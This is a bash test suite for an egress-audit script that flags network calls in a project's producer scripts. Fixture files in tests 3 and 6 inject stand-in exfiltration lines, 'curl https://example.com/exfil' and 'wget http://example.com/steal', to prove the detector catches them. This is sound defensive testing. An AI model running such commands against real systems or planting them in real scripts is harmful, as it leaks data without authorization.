#!/usr/bin/env bash
#
# Tests for check-producer-egress.sh (foundation #766, privacy/egress audit
# item): a synthetic fixture tree proves the GREEN path (the real, on-disk
# named producers pass clean), the RED path (an injected network-call
# pattern in a fixture producer is caught), the false-positive guards (a
# URL-scheme string literal and a hyphenated prose mention must NOT trip
# the check), the overlay-dir glob (a fixture report.d/ drop-in is scanned
# when --overlay-report-d is given, and skipped when it's omitted), and the
# soft-seam degrade (a missing producer/dir is a clean, non-failing skip).
#
# Mirrors test_check_personal_token_denylist.sh's plain mktemp-fixture
# style — no framework, just `fail()` + sequential asserts.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KERNEL_DIR="$(cd "$HERE/.." && pwd)"
# KERNEL_ROOT: the kernel/ subtree root (kernel/workflows/scripts/kernel/../../..)
# -- what a standalone kernel-only checkout would call its own repo root.
KERNEL_ROOT="$(cd "$KERNEL_DIR/../../.." && pwd)"
# FOUNDATION_ROOT: one level further up -- the composed foundation tree that
# vendors kernel/ as a subtree AND carries the foundation-only
# .foundation/report.d/ overlay outside kernel/ entirely. Only meaningful
# when this file is actually running from inside that vendored layout (a
# real standalone kernel-repo checkout has no such parent to speak of, but
# test 1 below only runs the composed-tree assertion when the resulting
# path actually resolves to a real kernel/ dir there -- see the guard).
FOUNDATION_ROOT="$(cd "$KERNEL_ROOT/.." && pwd)"
SCRIPT="$KERNEL_DIR/check-producer-egress.sh"

fail() { echo "FAIL: $1" >&2; exit 1; }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/producer-egress-test-XXXXXX")"
cleanup() { rm -rf "$WORK"; }
trap cleanup EXIT

# --- 1: GREEN — the REAL on-disk named producers pass clean -----------------
# Two invocations: the standalone-kernel-checkout shape (--kernel-root
# $KERNEL_ROOT, no overlay) always applies; the composed-tree shape
# (--kernel-root $FOUNDATION_ROOT/kernel --overlay-report-d
# $FOUNDATION_ROOT/.foundation/report.d) only when this file is actually
# vendored inside a foundation-shaped composed tree (guarded on that dir
# existing, so this test doesn't silently degrade to "nothing to scan" in
# a real standalone kernel repo, nor hard-fail there for a shape that
# repo doesn't have).
if ! bash "$SCRIPT" --kernel-root "$KERNEL_ROOT" >/dev/null 2>&1; then
  fail "1a: the real, current named kernel-tree producers should pass with zero egress-pattern hits"
fi
echo "PASS: 1a real kernel-tree producers pass clean (standalone shape)"

if [ -d "$FOUNDATION_ROOT/kernel/bin/subcommands" ]; then
  if ! bash "$SCRIPT" --kernel-root "$FOUNDATION_ROOT/kernel" --overlay-report-d "$FOUNDATION_ROOT/.foundation/report.d" >/dev/null 2>&1; then
    fail "1b: the real, current composed-tree producers (incl. overlay drop-ins) should pass with zero egress-pattern hits"
  fi
  echo "PASS: 1b real composed-tree producers + overlay drop-ins pass clean"
else
  echo "SKIP: 1b not running from inside a foundation-shaped composed tree"
fi

# --- fixture kernel-root: a minimal bin/subcommands/ + bin/foundation ------
FIX_KERNEL="$WORK/kernel"
mkdir -p "$FIX_KERNEL/bin/subcommands"
cat > "$FIX_KERNEL/bin/subcommands/baseline-snapshot.sh" <<'EOF'
#!/usr/bin/env bash
# a clean fixture producer -- local file write + a documented gh call only
gh pr list --json createdAt >/tmp/fixture.json
echo "local write" > /tmp/fixture-out
EOF
cat > "$FIX_KERNEL/bin/subcommands/report.sh" <<'EOF'
#!/usr/bin/env bash
# renders from the local baseline file only
cat /tmp/fixture-out
EOF
cat > "$FIX_KERNEL/bin/foundation" <<'EOF'
#!/usr/bin/env bash
# dispatcher fixture -- no network calls
echo dispatch
EOF

# --- 2: GREEN — clean fixture kernel-root, no overlay -----------------------
if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "2: clean fixture kernel-root (no overlay dir given) should pass"
fi
echo "PASS: 2 clean fixture kernel-root passes"

# --- 3: RED — inject a curl call into the fixture report.sh ----------------
echo 'curl https://example.com/exfil' >> "$FIX_KERNEL/bin/subcommands/report.sh"
if bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "3: an injected curl call should FAIL the check, but it passed"
fi
out="$(bash "$SCRIPT" --kernel-root "$FIX_KERNEL" 2>&1 || true)"
case "$out" in
  *"report.sh"*"curl invocation"*) ;;
  *) fail "3: failure output should name the offending file/pattern; got: $out" ;;
esac
echo "PASS: 3 injected curl call is caught (red demonstration)"

# --- 4: GREEN again — remove the injected line, check passes ---------------
cat > "$FIX_KERNEL/bin/subcommands/report.sh" <<'EOF'
#!/usr/bin/env bash
cat /tmp/fixture-out
EOF
if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "4: removing the injected curl call should restore a passing check"
fi
echo "PASS: 4 reverted fixture passes again"

# --- 5: false-positive guards -----------------------------------------------
# 5a: a URL-scheme string literal (ssh://...) parsed as DATA, not invoked.
cat > "$FIX_KERNEL/bin/subcommands/baseline-snapshot.sh" <<'EOF'
#!/usr/bin/env bash
case "$url" in
  ssh://git@github.com/*) slug="${url#ssh://git@github.com/}" ;;
esac
gh pr list --json createdAt >/tmp/fixture.json
EOF
if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "5a: a ssh:// URL-scheme string literal must not trip the check"
fi
echo "PASS: 5a ssh:// string literal does not false-positive"

# 5b: a hyphenated prose mention in a comment ("curl-bootstrap").
cat > "$FIX_KERNEL/bin/foundation" <<'EOF'
#!/usr/bin/env bash
# resolves the curl-bootstrap's symlink, same idiom as elsewhere
echo dispatch
EOF
if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "5b: a hyphenated prose mention of curl-bootstrap must not trip the check"
fi
echo "PASS: 5b curl-bootstrap prose mention does not false-positive"

# --- 6: overlay-dir glob — a report.d/ drop-in is scanned only when given ---
OVERLAY="$WORK/report.d"
mkdir -p "$OVERLAY"
cat > "$OVERLAY/tokens" <<'EOF'
#!/usr/bin/env bash
wget http://example.com/steal
EOF
chmod +x "$OVERLAY/tokens"

# Without --overlay-report-d: the drop-in is never scanned, still passes.
if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
  fail "6a: omitting --overlay-report-d should skip the drop-in entirely (pass)"
fi
echo "PASS: 6a overlay dir skipped when not given"

# With --overlay-report-d: the drop-in's wget call is caught.
if bash "$SCRIPT" --kernel-root "$FIX_KERNEL" --overlay-report-d "$OVERLAY" >/dev/null 2>&1; then
  fail "6b: the overlay drop-in's wget call should FAIL the check when scanned, but it passed"
fi
out="$(bash "$SCRIPT" --kernel-root "$FIX_KERNEL" --overlay-report-d "$OVERLAY" 2>&1 || true)"
case "$out" in
  *"tokens"*"wget invocation"*) ;;
  *) fail "6b: failure output should name the offending overlay drop-in; got: $out" ;;
esac
echo "PASS: 6b overlay drop-in scanned and caught when --overlay-report-d given"

# --- 7: soft seam — missing kernel-root / overlay dir degrades cleanly ------
if ! bash "$SCRIPT" --kernel-root "$WORK/does-not-exist" >/dev/null 2>&1; then
  fail "7: a wholly-missing kernel-root should degrade to a clean pass (nothing to scan), not fail"
fi
echo "PASS: 7 missing kernel-root degrades to a clean pass"

echo "ALL PASS: check-producer-egress.sh"
